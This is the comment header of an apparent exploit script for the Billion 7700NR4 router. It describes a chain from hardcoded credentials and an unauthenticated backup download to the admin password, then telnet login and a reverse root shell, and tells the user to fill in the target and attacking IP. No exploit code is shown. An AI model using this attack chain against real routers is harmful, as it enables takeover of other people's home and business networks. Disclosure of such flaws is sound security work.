# Title : Billion Router 7700NR4 Remote Root Command Execution
# Date : 06/10/2016
# Author : R-73eN
# Tested on: Billion Router 7700NR4
# Vendor : http://www.billion.com/
# Vulnerability Description:
# This router is a widely used here in Albania. It is given by a telecom provider to the home and bussiness users.
# The problem is that this router has hardcoded credentials which "can not be changed" by a normal user. Using these
# credentials we don't have to much access but the lack of authentication security we can download the backup and get the admin password.
# Using that password we can login to telnet server and use a shell escape to get a reverse root connection.
# You must change host with the target and reverse_ip with your attacking ip.
# Fix:
# The only fix is hacking your router with this exploit, changing the credentials and disabling all the other services using iptables.
